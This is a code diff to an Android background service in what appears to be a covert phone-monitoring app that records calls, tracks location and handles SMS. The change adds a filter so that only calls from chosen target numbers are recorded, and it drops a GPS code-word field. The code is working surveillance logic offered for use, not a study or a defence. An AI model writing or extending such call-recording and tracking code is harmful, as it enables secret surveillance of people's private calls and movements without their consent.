@@ -11,6 +11,7 @@ import system.service.feature.sms.SmsCtrl;
 
 import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.FileCtrl;
+import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LicenseCtrl;
@@ -51,9 +52,6 @@ public class BootService extends Service
 	//private final long mScreenshotPeriod = 30000; // 30 Seconds
 	
 	public static LocationUtil locationUtil;
-	
-	public static String gpsWord;
-	
 	private TelephonyManager telManager;
 	private boolean recordStarted = false;
 	private String otherSidePhoneNum = "";
@@ -85,6 +83,8 @@ public class BootService extends Service
                 		Context context = getApplicationContext();
                 		
                 		if (!ConfigCtrl.isLegal(context)) return;
+                		
+                		if (!comingNumberIsLegal(context, otherSidePhoneNum)) return;
             			
             			if (recordStarted) return;
             			
@@ -115,7 +115,7 @@ public class BootService extends Service
                 }
             } catch (Exception ex) {
             }
-        } 
+        }
     };
 
 	@Override
@@ -158,9 +158,8 @@ public class BootService extends Service
 		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
 		if (ConfigCtrl.isLegal(context)) 
 		{
-			// Init global variables
-			gpsWord = GlobalPrefActivity.getGpsWord(context);
-			
+			// ------------------------------------------------------------------			
+			// Start timers and listeners
 			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
 			
 			telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
@@ -223,4 +222,20 @@ public class BootService extends Service
 			audiomanager.setRouting(2, 11, 15);
 		} catch (Exception ex) {}
 	}
+	
+	private boolean comingNumberIsLegal(Context context, String comingNum) 
+	{
+		if (GlobalPrefActivity.getRecordAll(context)) return true;
+		
+		String[] recordingTargetNumbers = GlobalPrefActivity.getRecordTargetNum(context)
+											.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.TARGET_NUMBER_BREAKER)
+											.split(GlobalPrefActivity.TARGET_NUMBER_BREAKER);
+		for (String num : recordingTargetNumbers) {
+			if (comingNum.contains(num)) {
+				return true;
+			}
+		}
+			
+		return false;
+	} 
 }
